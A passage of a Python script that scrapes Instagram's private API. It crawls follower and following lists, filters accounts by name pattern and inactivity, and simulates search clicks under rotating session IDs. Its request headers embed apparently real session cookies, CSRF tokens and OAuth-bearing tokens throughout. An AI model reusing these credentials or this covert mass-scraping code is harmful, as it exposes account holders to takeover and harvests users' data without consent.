'aisley', 'eangelo', 'defensive', 'ckayla', 'wendolyn', 'atrick', 'accident', 'raceli', 'islelse', 'aityn', 'ulian', 'ranson', 'ellen', 'oaish', 'rasnon', 'sales', 'eandro', 'afael', 'newly', 'deva131', 'ferdaus', 'fitriafrana', 'rastaulina', 'slimdownwithshanel'
]
i = 131
# print(len(usernames))
# print(len(new_names))
# quit()

def get_following(instagram, relationship):

    def get_part_of_following(instagram, start, relationship = 'following'):
        # cookies = {
        #     'mid': 'ZBXtIQAEAAGWpHSR7XGgpHbOs4gD',
        #     'ig_did': '0CB4A17E-64F5-441F-9167-0E9F4EB88F5C',
        #     'ig_nrcb': '1',
        #     'datr': 'IO0VZE0tGLIAMSNFMq-HKUM1',
        #     'csrftoken': 'f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0',
        #     'ds_user_id': '58449324934',
        #     'fbm_124024574287414': 'base_domain=.instagram.com',
        #     'dpr': '2',
        #     'fbsr_124024574287414': 'M2-8Jqtd5wJq0M0Jc0voCItl_drn2FxV1N8DAAMcejQ.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQ1FoQTZMZW80VnRQTERZOWRlUDFyamJrTU9OTjBmZTBfU200bTZUcmI4M2RjaFBaQWROWUpIRUNYZW1kbHU4UFR0MkFsQU9NQzkzdVdjbXk2YjBQSjdJQ1hkWHRfeW5pNGN3M2Fqd2F1S09Sb3hzMTRTSE5VcUllXy04QkFKUlhKbzRkZHd5Zm9YaXpBeWlEalE0UmdIbjBhR0Y3Q2trcWQ5NmViRXhXX2t1WXgzY2Y1ZFlpdWpnVVhOLUR3YzdoYUVIaURKTUVEV2tqUWk4TTNUMGo0MTY3WEI2OFdoX25NT3dSUDhLWDNranM1NWxpa0JnUVFwMXlNYnJOWm9TcDhuRU5icGRnSC1nQlZKRWRFX3hPQ2I4T09kSzV5ZjE2NGx4anBpdTNORzlQTExZRmthRjhHVFE4Vl9FZ2I3LVhFRllvMkJlbzNvQ1dmaWtuUGY2U0ZnIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUZvTTYxWkJXY3ZZaVhFUVpCMDYyaGVpQm02alBKMVJaQ2laQTVud25QNHZpbUlRV0lZQjRVdWJaQ3hoNlBmSWVVWVFmSHpHbGRmME55bGx3WkJoTGFaQnZ2Z2lYWEFoVHpFbDk2NDNRREZCQ1FqSVlyejR4Y0xubzlqS1BOWkFJd1loeVZIdk1RSk5LQ3hDWXVxRmFEWkNXRDJRc2tGa3huamV2eTdVQ2xkWVh1NEcwQVlLWkFzNjRaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgyMjg4NzA5fQ',
        #     'sessionid': '58449324934%3A6WUkIv01qfppaB%3A3%3AAYdC-RNC3Ca1X_oXnit58OzLEzxK75xofoQBeC3_Y60',
        #     'rur': '"NAO\\05458449324934\\0541713824720:01f73cd6c56be33df0b2e7652d3d9b62ce88233849d7e859122dd052615da230ecbe68d3"',
        # }

        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': 'mid=YrX_FwABAAFVRYLepbLqUSO9nyBK; ig_did=B86D9D0C-8059-4D38-AB32-62F66F91EB8A; ig_nrcb=1; shbid="6887\054479320179\0541687630562:01f72f17d27d1bf82c5011a7e21c360468f4e96ffc8c8d9bc8f3389196b275ab0b6d598c"; shbts="1656094562\054479320179\0541687630562:01f75b9e3dad31375f7599a21ee1e6b0b33b430c850ee605a7591dd83682126848a683cd"; dpr=3; datr=av-1Yj1HLbt2sRgtjJ2hIyTk; rur="ASH\054479320179\0541687707865:01f7969a9a044b6e5a39c124177ea698ce171408d797be83e4e94e6efc69642ea3b90ed9"; csrftoken=QZnASSTl4lB3b1sG610j7UGrPk0TfrN0',#Very important cookies
            'referer': 'https://www.instagram.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; JSN-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
            'viewport-width': '360',
            'x-asbd-id': '437806',
            'x-csrftoken': 'QZnASSTl4lB3b1sG610j7UGrPk0TfrN0',
            'x-ig-app-id': '1217981644879628',
            'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
            'x-instagram-ajax': '57ac339ce6f4',
            'x-requested-with': 'XMLHttpRequest'
        }

        params = {
            'count': 200,
            'max_id': start,
        }

        response = requests.get(
            f'https://www.instagram.com/api/v1/friendships/{get_id(instagram)}/{relationship}/',
            params=params,
            # cookies=cookies,
            headers=headers,
        ) 
        # print(response.text)

        following = []
        json = response.json()
        try:
            for user in json['users']:
                if (user['username'][:min(len(user['full_name']), len(user['username']))] == user['full_name']) and len(user['full_name']) >= 5 and str(user["latest_reel_media"]) == '0':
                    following.append(user['username'])
                    if user['full_name'] not in new_names: new_names.append(user['full_name'])
            return following
        except:
            return []

    following = []
    ship = []
    prev = -1
    i = 0
    j = 0
    while len(following) != prev:
        prev = len(following)
        # print(len(following))
        [following.append(f) for f in get_part_of_following(instagram, start = 200*i, relationship = relationship) if f not in following]
        # print(len(following))
        i += 1
        # while j < len(following):
        #     person = following[j]
        #     res = text_in_caption(person)
        #     print(res, person)
        #     if res == True: ship.append(person)
        #     j += 1
        # print(ship)
    return following

def add_more_names():
    while i < len(usernames):
        [usernames.append(u) for u in get_following(usernames[i], 'followers') if u not in usernames]
        [usernames.append(u) for u in get_following(usernames[i], 'following') if u not in usernames]
        i+=1
        print(i, len(usernames), 'usernames', usernames)

        if i%10 == 0:
            print ('new_names: ', len(new_names), new_names)

# add_more_names()

def click_search1(id, i):
    session_id = session_ids[i]
    cookies = {
        'mid': 'ZBXtIQAEAAGWpHSR7XGgpHbOs4gD',
        'ig_did': '0CB4A17E-64F5-441F-9167-0E9F4EB88F5C',
        'ig_nrcb': '1',
        'datr': 'IO0VZE0tGLIAMSNFMq-HKUM1',
        'fbm_124024574287414': 'base_domain=.instagram.com',
        'ds_user_id': '58603175168',
        'csrftoken': 'f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0',
        'shbid': '"12360\\05458603175168\\0541714351046:01f7506e1801a5fa2a0effcc20b7d3a05ce7a12d21e1b9ab11e35c5e29c492f1280703a1"',
        'shbts': '"1682815046\\05458603175168\\0541714351046:01f7901ec35e9a41be3096eb73be2785099a7d2517ba0c438923a01b5a966c98623babe2"',
        'dpr': '2',
        'fbsr_124024574287414': 'QKr7WPAe9_Iuz16t8mZysdT_UaCWkywfUgr8wq8nek4.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQjRtRmdHU1o5eXliOVc5cFF4ZTFaMGpiLVR1UjdmRUo5eXM5ZVVhNjJhdTRmejQ1TWowWENhNDZfX1FtakkySWFVTXJ1VGViME9QRVVIV0o3RmtCWFlQeUFjUEx1YWwzZmxTWk8xTVd1eXNvNUtkSGk2MTFhbUdmWlZlSUZHRjRzQkVVWFo2a1pUS1ZfcmJsRnpSS2k5Y1RDUmdGaWFhdmYtVnlJd01RamRsSmppODhSaUFkczE2ZWhrbzA4VWNiNmp4Mi1JVWhYYkstTVBWa1lZczctUGJwSkMxbkZhSktRdUdwT2I5NExpZjNmQTBWN3lYZHQyUFR6aTMtX0FscWd0LXk2a0Z5dnJLMHktM2hOaXpzay1KWXQwNjhkMXlsUGZ1Qkc5UFBTX2JZUTJZQktFUVpoNWtQN3BIejlQcWtrLW5TN0Y4Y1NjWlJBYU5XeWJzMFFsIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUdjanVDQmluTEFUek9xcG9LOUZFdDhnaUQ0aXZIZkFrWkFkN0hBeTlEbjh5c0k5Y3ZCaDFaQTc3bHQwdnRpV1huM0RIZlpCRU81VnBiejFhWkNNRkxOYVJGcTR0bkxXaEQ0RDJUWkFRWUlQTHFNZE1QNHlWWEVyNDRRR0hLOFJTeE4zMlpDRkhuWUVmRWQySHVaQ2ZQbjEydXN4d2F0NkFKVFd1ZVc2d2lxQm9QM1lyVmtaQ0dZWkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY4Mjg0MzkwM30',
        'rur': '"FRC\\05458603175168\\0541714379907:01f7904102bb491d807d0dfc9030f6f4d02157f4be2bb2ff44551670052c8e5c31ce0eb6"',
        'sessionid': session_id,
    }

    headers = {
        'authority': 'www.instagram.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'mid=ZBXtIQAEAAGWpHSR7XGgpHbOs4gD; ig_did=0CB4A17E-64F5-441F-9167-0E9F4EB88F5C; ig_nrcb=1; datr=IO0VZE0tGLIAMSNFMq-HKUM1; fbm_124024574287414=base_domain=.instagram.com; ds_user_id=58603175168; csrftoken=f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0; shbid="12360\\05458603175168\\0541714351046:01f7506e1801a5fa2a0effcc20b7d3a05ce7a12d21e1b9ab11e35c5e29c492f1280703a1"; shbts="1682815046\\05458603175168\\0541714351046:01f7901ec35e9a41be3096eb73be2785099a7d2517ba0c438923a01b5a966c98623babe2"; dpr=2; fbsr_124024574287414=QKr7WPAe9_Iuz16t8mZysdT_UaCWkywfUgr8wq8nek4.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQjRtRmdHU1o5eXliOVc5cFF4ZTFaMGpiLVR1UjdmRUo5eXM5ZVVhNjJhdTRmejQ1TWowWENhNDZfX1FtakkySWFVTXJ1VGViME9QRVVIV0o3RmtCWFlQeUFjUEx1YWwzZmxTWk8xTVd1eXNvNUtkSGk2MTFhbUdmWlZlSUZHRjRzQkVVWFo2a1pUS1ZfcmJsRnpSS2k5Y1RDUmdGaWFhdmYtVnlJd01RamRsSmppODhSaUFkczE2ZWhrbzA4VWNiNmp4Mi1JVWhYYkstTVBWa1lZczctUGJwSkMxbkZhSktRdUdwT2I5NExpZjNmQTBWN3lYZHQyUFR6aTMtX0FscWd0LXk2a0Z5dnJLMHktM2hOaXpzay1KWXQwNjhkMXlsUGZ1Qkc5UFBTX2JZUTJZQktFUVpoNWtQN3BIejlQcWtrLW5TN0Y4Y1NjWlJBYU5XeWJzMFFsIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUdjanVDQmluTEFUek9xcG9LOUZFdDhnaUQ0aXZIZkFrWkFkN0hBeTlEbjh5c0k5Y3ZCaDFaQTc3bHQwdnRpV1huM0RIZlpCRU81VnBiejFhWkNNRkxOYVJGcTR0bkxXaEQ0RDJUWkFRWUlQTHFNZE1QNHlWWEVyNDRRR0hLOFJTeE4zMlpDRkhuWUVmRWQySHVaQ2ZQbjEydXN4d2F0NkFKVFd1ZVc2d2lxQm9QM1lyVmtaQ0dZWkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY4Mjg0MzkwM30; rur="FRC\\05458603175168\\0541714379907:01f7904102bb491d807d0dfc9030f6f4d02157f4be2bb2ff44551670052c8e5c31ce0eb6"; sessionid=58603175168%3Asv2ODVlrx539vv%3A27%3AAYfIcPU_OehpM3Rl7NMqtqdpbYHSGDhNBL4ugq3_nQ',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.137", "Google Chrome";v="112.0.5615.137", "Not:A-Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'viewport-width': '1792',
        'x-asbd-id': '198387',
        'x-csrftoken': 'f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR3j-GDo7PhBSoIIlQPLGWCe3MS_Ixr-eOD3mLCFCjq8V7iF',
        'x-instagram-ajax': '1007403768',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'entity_id': id,
        'entity_type': 'user',
    }

    response = requests.post(
        'https://www.instagram.com/api/v1/fbsearch/register_recent_search_click/',
        cookies=cookies,
        headers=headers,
        data=data,
    )

def click_search2(id, i):
    session_id = session_ids[i]
    cookies = {
        'mid': 'ZBXtIQAEAAGWpHSR7XGgpHbOs4gD',
        'ig_did': '0CB4A17E-64F5-441F-9167-0E9F4EB88F5C',
        'ig_nrcb': '1',
        'datr': 'IO0VZE0tGLIAMSNFMq-HKUM1',
        'fbm_124024574287414': 'base_domain=.instagram.com',
        'ds_user_id': '58603175168',
        'csrftoken': 'f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0',
        'shbid': '"12360\\05458603175168\\0541714351046:01f7506e1801a5fa2a0effcc20b7d3a05ce7a12d21e1b9ab11e35c5e29c492f1280703a1"',
        'shbts': '"1682815046\\05458603175168\\0541714351046:01f7901ec35e9a41be3096eb73be2785099a7d2517ba0c438923a01b5a966c98623babe2"',
        'dpr': '2',
        'fbsr_124024574287414': 'QKr7WPAe9_Iuz16t8mZysdT_UaCWkywfUgr8wq8nek4.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQjRtRmdHU1o5eXliOVc5cFF4ZTFaMGpiLVR1UjdmRUo5eXM5ZVVhNjJhdTRmejQ1TWowWENhNDZfX1FtakkySWFVTXJ1VGViME9QRVVIV0o3RmtCWFlQeUFjUEx1YWwzZmxTWk8xTVd1eXNvNUtkSGk2MTFhbUdmWlZlSUZHRjRzQkVVWFo2a1pUS1ZfcmJsRnpSS2k5Y1RDUmdGaWFhdmYtVnlJd01RamRsSmppODhSaUFkczE2ZWhrbzA4VWNiNmp4Mi1JVWhYYkstTVBWa1lZczctUGJwSkMxbkZhSktRdUdwT2I5NExpZjNmQTBWN3lYZHQyUFR6aTMtX0FscWd0LXk2a0Z5dnJLMHktM2hOaXpzay1KWXQwNjhkMXlsUGZ1Qkc5UFBTX2JZUTJZQktFUVpoNWtQN3BIejlQcWtrLW5TN0Y4Y1NjWlJBYU5XeWJzMFFsIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUdjanVDQmluTEFUek9xcG9LOUZFdDhnaUQ0aXZIZkFrWkFkN0hBeTlEbjh5c0k5Y3ZCaDFaQTc3bHQwdnRpV1huM0RIZlpCRU81VnBiejFhWkNNRkxOYVJGcTR0bkxXaEQ0RDJUWkFRWUlQTHFNZE1QNHlWWEVyNDRRR0hLOFJTeE4zMlpDRkhuWUVmRWQySHVaQ2ZQbjEydXN4d2F0NkFKVFd1ZVc2d2lxQm9QM1lyVmtaQ0dZWkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY4Mjg0MzkwM30',
        'rur': '"FRC\\05458603175168\\0541714379907:01f7904102bb491d807d0dfc9030f6f4d02157f4be2bb2ff44551670052c8e5c31ce0eb6"',
        'sessionid': session_id,
    }

    headers = {
        'authority': 'www.instagram.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'mid=ZBXtIQAEAAGWpHSR7XGgpHbOs4gD; ig_did=0CB4A17E-64F5-441F-9167-0E9F4EB88F5C; ig_nrcb=1; datr=IO0VZE0tGLIAMSNFMq-HKUM1; fbm_124024574287414=base_domain=.instagram.com; ds_user_id=58603175168; csrftoken=f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0; shbid="12360\\05458603175168\\0541714351046:01f7506e1801a5fa2a0effcc20b7d3a05ce7a12d21e1b9ab11e35c5e29c492f1280703a1"; shbts="1682815046\\05458603175168\\0541714351046:01f7901ec35e9a41be3096eb73be2785099a7d2517ba0c438923a01b5a966c98623babe2"; dpr=2; fbsr_124024574287414=QKr7WPAe9_Iuz16t8mZysdT_UaCWkywfUgr8wq8nek4.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQjRtRmdHU1o5eXliOVc5cFF4ZTFaMGpiLVR1UjdmRUo5eXM5ZVVhNjJhdTRmejQ1TWowWENhNDZfX1FtakkySWFVTXJ1VGViME9QRVVIV0o3RmtCWFlQeUFjUEx1YWwzZmxTWk8xTVd1eXNvNUtkSGk2MTFhbUdmWlZlSUZHRjRzQkVVWFo2a1pUS1ZfcmJsRnpSS2k5Y1RDUmdGaWFhdmYtVnlJd01RamRsSmppODhSaUFkczE2ZWhrbzA4VWNiNmp4Mi1JVWhYYkstTVBWa1lZczctUGJwSkMxbkZhSktRdUdwT2I5NExpZjNmQTBWN3lYZHQyUFR6aTMtX0FscWd0LXk2a0Z5dnJLMHktM2hOaXpzay1KWXQwNjhkMXlsUGZ1Qkc5UFBTX2JZUTJZQktFUVpoNWtQN3BIejlQcWtrLW5TN0Y4Y1NjWlJBYU5XeWJzMFFsIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUdjanVDQmluTEFUek9xcG9LOUZFdDhnaUQ0aXZIZkFrWkFkN0hBeTlEbjh5c0k5Y3ZCaDFaQTc3bHQwdnRpV1huM0RIZlpCRU81VnBiejFhWkNNRkxOYVJGcTR0bkxXaEQ0RDJUWkFRWUlQTHFNZE1QNHlWWEVyNDRRR0hLOFJTeE4zMlpDRkhuWUVmRWQySHVaQ2ZQbjEydXN4d2F0NkFKVFd1ZVc2d2lxQm9QM1lyVmtaQ0dZWkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY4Mjg0MzkwM30; rur="FRC\\05458603175168\\0541714379907:01f7904102bb491d807d0dfc9030f6f4d02157f4be2bb2ff44551670052c8e5c31ce0eb6"; sessionid=58603175168%3Asv2ODVlrx539vv%3A27%3AAYfIcPU_OehpM3Rl7NMqtqdpbYHSGDhNBL4ugq3_nQ',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.137", "Google Chrome";v="112.0.5615.137", "Not:A-Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'viewport-width': '1792',
        'x-asbd-id': '198387',
        'x-csrftoken': 'f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR3j-GDo7PhBSoIIlQPLGWCe3MS_Ixr-eOD3mLCFCjq8V7iF',
        'x-instagram-ajax': '1007403768',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'entity_id': id,
        'entity_type': 'user',
    }

    response = requests.post(
        'https://www.instagram.com/api/v1/fbsearch/register_recent_search_click/',
        cookies=cookies,
        headers=headers,
        data=data,
    )

def click_search3(username, i):
    session_id = session_ids[i]
    cookies = {
        'mid': 'ZBXtIQAEAAGWpHSR7XGgpHbOs4gD',
        'ig_did': '0CB4A17E-64F5-441F-9167-0E9F4EB88F5C',
        'ig_nrcb': '1',
        'datr': 'IO0VZE0tGLIAMSNFMq-HKUM1',
        'fbm_124024574287414': 'base_domain=.instagram.com',
        'ds_user_id': '58603175168',
        'csrftoken': 'f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0',
        'shbid': '"12360\\05458603175168\\0541714351046:01f7506e1801a5fa2a0effcc20b7d3a05ce7a12d21e1b9ab11e35c5e29c492f1280703a1"',
        'shbts': '"1682815046\\05458603175168\\0541714351046:01f7901ec35e9a41be3096eb73be2785099a7d2517ba0c438923a01b5a966c98623babe2"',
        'dpr': '2',
        'fbsr_124024574287414': 'QKr7WPAe9_Iuz16t8mZysdT_UaCWkywfUgr8wq8nek4.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQjRtRmdHU1o5eXliOVc5cFF4ZTFaMGpiLVR1UjdmRUo5eXM5ZVVhNjJhdTRmejQ1TWowWENhNDZfX1FtakkySWFVTXJ1VGViME9QRVVIV0o3RmtCWFlQeUFjUEx1YWwzZmxTWk8xTVd1eXNvNUtkSGk2MTFhbUdmWlZlSUZHRjRzQkVVWFo2a1pUS1ZfcmJsRnpSS2k5Y1RDUmdGaWFhdmYtVnlJd01RamRsSmppODhSaUFkczE2ZWhrbzA4VWNiNmp4Mi1JVWhYYkstTVBWa1lZczctUGJwSkMxbkZhSktRdUdwT2I5NExpZjNmQTBWN3lYZHQyUFR6aTMtX0FscWd0LXk2a0Z5dnJLMHktM2hOaXpzay1KWXQwNjhkMXlsUGZ1Qkc5UFBTX2JZUTJZQktFUVpoNWtQN3BIejlQcWtrLW5TN0Y4Y1NjWlJBYU5XeWJzMFFsIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUdjanVDQmluTEFUek9xcG9LOUZFdDhnaUQ0aXZIZkFrWkFkN0hBeTlEbjh5c0k5Y3ZCaDFaQTc3bHQwdnRpV1huM0RIZlpCRU81VnBiejFhWkNNRkxOYVJGcTR0bkxXaEQ0RDJUWkFRWUlQTHFNZE1QNHlWWEVyNDRRR0hLOFJTeE4zMlpDRkhuWUVmRWQySHVaQ2ZQbjEydXN4d2F0NkFKVFd1ZVc2d2lxQm9QM1lyVmtaQ0dZWkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY4Mjg0MzkwM30',
        'rur': '"FRC\\05458603175168\\0541714379907:01f7904102bb491d807d0dfc9030f6f4d02157f4be2bb2ff44551670052c8e5c31ce0eb6"',
        'sessionid': session_id,
    }

    headers = {
        'authority': 'www.instagram.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        # 'cookie': 'mid=ZBXtIQAEAAGWpHSR7XGgpHbOs4gD; ig_did=0CB4A17E-64F5-441F-9167-0E9F4EB88F5C; ig_nrcb=1; datr=IO0VZE0tGLIAMSNFMq-HKUM1; fbm_124024574287414=base_domain=.instagram.com; ds_user_id=58603175168; csrftoken=f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0; shbid="12360\\05458603175168\\0541714351046:01f7506e1801a5fa2a0effcc20b7d3a05ce7a12d21e1b9ab11e35c5e29c492f1280703a1"; shbts="1682815046\\05458603175168\\0541714351046:01f7901ec35e9a41be3096eb73be2785099a7d2517ba0c438923a01b5a966c98623babe2"; dpr=2; fbsr_124024574287414=QKr7WPAe9_Iuz16t8mZysdT_UaCWkywfUgr8wq8nek4.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQjRtRmdHU1o5eXliOVc5cFF4ZTFaMGpiLVR1UjdmRUo5eXM5ZVVhNjJhdTRmejQ1TWowWENhNDZfX1FtakkySWFVTXJ1VGViME9QRVVIV0o3RmtCWFlQeUFjUEx1YWwzZmxTWk8xTVd1eXNvNUtkSGk2MTFhbUdmWlZlSUZHRjRzQkVVWFo2a1pUS1ZfcmJsRnpSS2k5Y1RDUmdGaWFhdmYtVnlJd01RamRsSmppODhSaUFkczE2ZWhrbzA4VWNiNmp4Mi1JVWhYYkstTVBWa1lZczctUGJwSkMxbkZhSktRdUdwT2I5NExpZjNmQTBWN3lYZHQyUFR6aTMtX0FscWd0LXk2a0Z5dnJLMHktM2hOaXpzay1KWXQwNjhkMXlsUGZ1Qkc5UFBTX2JZUTJZQktFUVpoNWtQN3BIejlQcWtrLW5TN0Y4Y1NjWlJBYU5XeWJzMFFsIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUdjanVDQmluTEFUek9xcG9LOUZFdDhnaUQ0aXZIZkFrWkFkN0hBeTlEbjh5c0k5Y3ZCaDFaQTc3bHQwdnRpV1huM0RIZlpCRU81VnBiejFhWkNNRkxOYVJGcTR0bkxXaEQ0RDJUWkFRWUlQTHFNZE1QNHlWWEVyNDRRR0hLOFJTeE4zMlpDRkhuWUVmRWQySHVaQ2ZQbjEydXN4d2F0NkFKVFd1ZVc2d2lxQm9QM1lyVmtaQ0dZWkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY4Mjg0MzkwM30; rur="FRC\\05458603175168\\0541714379907:01f7904102bb491d807d0dfc9030f6f4d02157f4be2bb2ff44551670052c8e5c31ce0eb6"; sessionid=58603175168%3Asv2ODVlrx539vv%3A27%3AAYfIcPU_OehpM3Rl7NMqtqdpbYHSGDhNBL4ugq3_nQ',
        'referer': 'https://www.instagram.com/',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.137", "Google Chrome";v="112.0.5615.137", "Not:A-Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'viewport-width': '1792',
        'x-asbd-id': '198387',
        'x-csrftoken': 'f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR3j-GDo7PhBSoIIlQPLGWCe3MS_Ixr-eOD3mLCFCjq8V7iF',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'username': username,
    }

    response = requests.get(
        'https://www.instagram.com/api/v1/users/web_profile_info/',
        params=params,
        cookies=cookies,
        headers=headers,
    )

## Step 1
letters = string.ascii_lowercase#'aeiou'
def find_all(name, pause, i): ## Find all ig names that have username starting with said name

    def search_response(text, i):
        session_id = session_ids[i]
        print(session_id)
        cookies = {
            'dpr': '2',
            # 'ig_did': 'E40A4639-014A-4CB9-B7BB-BC714CC64ADC',
            # 'datr': 'bk9LZH4-G3kIKZ8LKusDuUAG',
            # 'mid': 'ZEtPbgAEAAGN06MvDvird9I23YS_',
            'ig_nrcb': '1',
            # 'csrftoken': 'Wfr2SFijE1rzMbk8X0rsm1ZDEPQtrEwq',
            # 'ds_user_id': '59341379259',
            'sessionid': session_id,
            # 'rur': '"NCG\\05459341379259\\0541714193389:01f71342637e0e9f5ee15fb37aa7b7b02b533c2101c33dc6a652aa6717bb73b88614a922"',
        }

        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            # 'cookie': 'dpr=2; ig_did=E40A4639-014A-4CB9-B7BB-BC714CC64ADC; datr=bk9LZH4-G3kIKZ8LKusDuUAG; mid=ZEtPbgAEAAGN06MvDvird9I23YS_; ig_nrcb=1; csrftoken=Wfr2SFijE1rzMbk8X0rsm1ZDEPQtrEwq; ds_user_id=59341379259; sessionid=59341379259%3AHlmaoAVVp858lx%3A5%3AAYckapFrxSnJBYGg0_k2w9ysj3Wy9T3SmNsUUCRP9w; rur="NCG\\05459341379259\\0541714193389:01f71342637e0e9f5ee15fb37aa7b7b02b533c2101c33dc6a652aa6717bb73b88614a922"',
            'referer': 'https://www.instagram.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.137", "Google Chrome";v="112.0.5615.137", "Not:A-Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'viewport-width': '1792',
            'x-asbd-id': '198387',
            # 'x-csrftoken': 'Wfr2SFijE1rzMbk8X0rsm1ZDEPQtrEwq',
            # 'x-ig-app-id': '936619743392459',
            # 'x-ig-www-claim': 'hmac.AR2YO6VDIeOp7b_M_Yk0IXDnUlUsCYvmoFDnF_KDxACqvVNF',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'context': 'blended',
            'query': text,
            # 'rank_token': '0.8390871672416107',
            'include_reel': 'true',
            'search_surface': 'web_top_search',
